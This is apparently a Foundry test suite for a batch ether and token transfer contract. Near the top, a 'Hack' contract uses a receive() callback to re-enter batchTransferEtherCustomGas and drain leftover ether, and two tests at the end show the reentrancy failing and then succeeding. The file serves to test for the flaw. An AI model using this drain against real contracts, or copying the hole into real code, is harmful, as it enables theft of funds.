pragma solidity 0.8.10;

import {console} from "forge-std/console.sol";
import {Utils} from "./utils/Utils.sol";
import {Faucet} from "./utils/Faucet.sol";
import {MockERC20} from "./utils/MockERC20.sol";
import {ERC20MockTronUSDT} from "./utils/tronUSDT.sol";

import "forge-std/Test.sol";
import "./utils/BatchTransferTronMock.sol";

contract Hack {
    address public receivedAddress = address(99999999999);

    receive() external payable {
        if (msg.sender.balance == 0) {
            return;
        }
        address payable[] memory recipients = new address payable[](1);
        recipients[0] = payable(receivedAddress);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = msg.sender.balance;

        console.log("balance before hack", receivedAddress.balance);
        BatchTransferTron(msg.sender).batchTransferEtherCustomGas(recipients, amounts, 10000);
        console.log("balance after hack", receivedAddress.balance);
    }
}

contract BatchTransferTest is Test {
    BatchTransferTron public trans;
    Utils internal utils;
    Faucet internal faucet;
    MockERC20 internal token;
    ERC20MockTronUSDT internal tronUSDT;

    address payable[] internal users;
    address payable internal alice;
    address payable internal bob;
    address payable internal jack;
    address payable internal rose;
    Hack hacker;

    function setUp() public {
        //mock infra
        hacker = new Hack();
        trans = new BatchTransferTron();
        utils = new Utils();
        token = new MockERC20();
        faucet = new Faucet(token);
        token.mint(address(faucet), 1000);
        tronUSDT = new ERC20MockTronUSDT();
        //mock users
        users = utils.createUsers(4);
        alice = users[0];
        vm.label(alice, "Alice");
        bob = users[1];
        vm.label(bob, "Bob");
        jack = users[2];
        vm.label(jack, "Jack");
        rose = users[3];
        vm.label(rose, "Rose");
    }

    function test_TransETH() public {
        vm.deal(bob, 1 ether);
        vm.deal(alice, 1000 ether);
        assertEq(alice.balance, 1000 ether);
        assertEq(bob.balance, 1 ether);

        address payable[] memory recvs = new address payable[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 100 ether;
        amounts[1] = 200 ether;
        amounts[2] = 300 ether;

        vm.prank(address(alice));
        trans.batchTransferEther{value: 600 ether}(recvs, amounts);

        //after batch transfer
        assertEq(address(bob).balance, 101 ether);
        assertEq(address(jack).balance, 200 ether);
        assertEq(rose.balance, 300 ether);
        assertEq(alice.balance, 400 ether);
    }

    function testFail_TransETH_NOFUND() public {
        vm.deal(alice, 1000 ether);
        vm.deal(bob, 1 ether);
        vm.prank(alice); //mock sender
        address payable[] memory recvs = new address payable[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 100 ether;
        amounts[1] = 200 ether;
        amounts[2] = 300 ether;
        trans.batchTransferEther{value: 599 ether}(recvs, amounts);
    }

    function testFail_TransETH_AVAILABE_NOT_ENOUGH() public {
        vm.deal(alice, 599 ether);
        vm.deal(bob, 1 ether);
        vm.prank(alice); //mock sender
        address payable[] memory recvs = new address payable[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 100 ether;
        amounts[1] = 200 ether;
        amounts[2] = 300 ether;
        trans.batchTransferEther{value: 600 ether}(recvs, amounts);
    }

    function testFail_TransETH_LENGTH_MISS_MATCH() public {
        vm.deal(alice, 600 ether);
        vm.deal(bob, 1 ether);
        vm.prank(alice); //mock sender
        address payable[] memory recvs = new address payable[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100 ether;
        amounts[1] = 200 ether;
        trans.batchTransferEther{value: 600 ether}(recvs, amounts);
    }

    function test_TransERC20() public {
        faucet.drip(alice, 90);
        address[] memory recvs = new address[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 10;
        amounts[1] = 20;
        amounts[2] = 30;

        //console.log(token.balanceOf(alice));
        assertEq(token.balanceOf(alice), 90);
        vm.prank(alice); //mock sender
        require(token.approve(address(trans), 60));
        vm.prank(alice); //mock sender
        trans.batchTransferToken(address(token), recvs, amounts);
        assertEq(token.balanceOf(bob), 10);
        assertEq(token.balanceOf(jack), 20);
        assertEq(token.balanceOf(rose), 30);
    }

    function testFail_TransERC20_NO_ALLOWRANCE() public {
        faucet.drip(alice, 90);
        address[] memory recvs = new address[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 10;
        amounts[1] = 20;
        amounts[2] = 30;

        //console.log(token.balanceOf(alice));
        assertEq(token.balanceOf(alice), 90);
        vm.prank(alice); //mock sender
        trans.batchTransferToken(address(token), recvs, amounts);
    }

    function testFail_TransERC20_NO_ENOUGH_ALLOWRANCE() public {
        faucet.drip(alice, 90);
        address[] memory recvs = new address[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 10;
        amounts[1] = 20;
        amounts[2] = 30;

        //console.log(token.balanceOf(alice));
        assertEq(token.balanceOf(alice), 90);
        vm.prank(alice); //mock sender
        require(token.approve(address(trans), 59));
        vm.prank(alice); //mock sender
        trans.batchTransferToken(address(token), recvs, amounts);
    }

    function testFail_TransERC20_NO_ENOUGH_FUND() public {
        faucet.drip(alice, 59);
        address[] memory recvs = new address[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 10;
        amounts[1] = 20;
        amounts[2] = 30;

        //console.log(token.balanceOf(alice));
        assertEq(token.balanceOf(alice), 59);
        vm.prank(alice); //mock sender
        require(token.approve(address(trans), 59));
        vm.prank(alice); //mock sender
        trans.batchTransferToken(address(token), recvs, amounts);
    }

    function testFail_TransERC20_LEN_MISS_MATCH() public {
        faucet.drip(alice, 60);
        address[] memory recvs = new address[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 10;
        amounts[1] = 20;

        //console.log(token.balanceOf(alice));
        assertEq(token.balanceOf(alice), 60);
        vm.prank(alice); //mock sender
        require(token.approve(address(trans), 60));
        vm.prank(alice); //mock sender
        trans.batchTransferToken(address(token), recvs, amounts);
    }

    function test_TransERC20_SIMPLE() public {
        faucet.drip(alice, 90);
        address[] memory recvs = new address[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 10;
        amounts[1] = 20;
        amounts[2] = 30;

        //console.log(token.balanceOf(alice));
        assertEq(token.balanceOf(alice), 90);
        vm.prank(alice); //mock sender
        require(token.approve(address(trans), 60));
        vm.prank(alice); //mock sender
        trans.batchTransferTokenSimple(address(token), recvs, amounts);
        assertEq(token.balanceOf(bob), 10);
        assertEq(token.balanceOf(jack), 20);
        assertEq(token.balanceOf(rose), 30);
    }

    function testFail_TransERC20_SIMPLE_NO_ALLOWRANCE() public {
        faucet.drip(alice, 90);
        address[] memory recvs = new address[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 10;
        amounts[1] = 20;
        amounts[2] = 30;

        //console.log(token.balanceOf(alice));
        assertEq(token.balanceOf(alice), 90);
        vm.prank(alice); //mock sender
        trans.batchTransferTokenSimple(address(token), recvs, amounts);
    }

    function testFail_TransERC20_SIMPLE_NO_ENOUGH_ALLOWRANCE() public {
        faucet.drip(alice, 90);
        address[] memory recvs = new address[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 10;
        amounts[1] = 20;
        amounts[2] = 30;

        //console.log(token.balanceOf(alice));
        assertEq(token.balanceOf(alice), 90);
        vm.prank(alice); //mock sender
        require(token.approve(address(trans), 59));
        vm.prank(alice); //mock sender
        trans.batchTransferTokenSimple(address(token), recvs, amounts);
    }

    function testFail_TransERC20_SIMPLE_NO_ENOUGH_FUND() public {
        faucet.drip(alice, 59);
        address[] memory recvs = new address[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 10;
        amounts[1] = 20;
        amounts[2] = 30;

        //console.log(token.balanceOf(alice));
        assertEq(token.balanceOf(alice), 59);
        vm.prank(alice); //mock sender
        require(token.approve(address(trans), 59));
        vm.prank(alice); //mock sender
        trans.batchTransferTokenSimple(address(token), recvs, amounts);
    }

    function testFail_TransERC20_SIMPLE_LEN_MISS_MATCH() public {
        faucet.drip(alice, 60);
        address[] memory recvs = new address[](3);
        recvs[0] = bob;
        recvs[1] = jack;
        recvs[2] = rose;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 10;
        amounts[1] = 20;

        //console.log(token.balanceOf(alice));
        assertEq(token.balanceOf(alice), 60);
        vm.prank(alice); //mock sender
        require(token.approve(address(trans), 60));
        vm.prank(alice); //mock sender
        trans.batchTransferTokenSimple(address(token), recvs, amounts);
    }

    function testFail_TransERC20_TRON_USDT() public {
        uint256 defaultAmount = 100;
        tronUSDT.mint(alice, defaultAmount);
        address[] memory recvs = new address[](2);
        recvs[0] = bob;
        recvs[1] = jack;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 10;
        amounts[1] = 40;

        assertEq(tronUSDT.balanceOf(alice), defaultAmount);
        vm.prank(alice); //mock sender
        require(tronUSDT.approve(address(trans), defaultAmount));
        vm.prank(alice); //mock sender
        trans.batchTransferToken(address(tronUSDT), recvs, amounts);
    }

    function test_TransERC20_TRON_USDT_SUCCESS() public {
        uint256 defaultAmount = 100;
        tronUSDT.mint(alice, defaultAmount);
        address[] memory recvs = new address[](2);
        recvs[0] = bob;
        recvs[1] = jack;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 10;
        amounts[1] = 40;

        assertEq(tronUSDT.balanceOf(alice), defaultAmount);
        vm.prank(alice); //mock sender
        require(tronUSDT.approve(address(trans), defaultAmount / 2));
        vm.prank(alice); //mock sender
        trans.setTronusdt(address(tronUSDT));
        vm.prank(alice); //mock sender
        trans.batchTransferToken(address(tronUSDT), recvs, amounts);
        assertEq(tronUSDT.balanceOf(alice), defaultAmount / 2);
    }

    function testFail_Hack() public {
        address payable[] memory recipients = new address payable[](3);
        recipients[0] = payable(address(1));
        recipients[1] = payable(address(2));
        recipients[2] = payable(address(hacker));
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1 ether;
        amounts[1] = 1 ether;
        amounts[2] = 1 ether;

        trans.batchTransferEther{value: 4 ether}(recipients, amounts);
    }

    function test_Hack_success() public {
        address payable[] memory recipients = new address payable[](3);
        recipients[0] = payable(address(1));
        recipients[1] = payable(address(2));
        recipients[2] = payable(hacker);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1 ether;
        amounts[1] = 1 ether;
        amounts[2] = 1 ether;

        trans.batchTransferEtherCustomGas{value: 4 ether}(recipients, amounts, 100000);
        assertEq(hacker.receivedAddress().balance, 1 ether);
    }
}
